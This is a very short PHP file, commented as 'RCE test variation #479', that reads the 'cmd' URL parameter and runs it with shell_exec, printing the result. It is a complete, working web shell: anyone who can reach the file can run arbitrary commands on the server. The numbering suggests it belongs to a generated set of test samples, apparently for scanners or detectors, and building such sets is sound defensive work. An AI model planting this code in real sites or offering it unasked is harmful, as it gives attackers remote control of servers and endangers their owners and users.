<?php
// RCE test variation #479
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>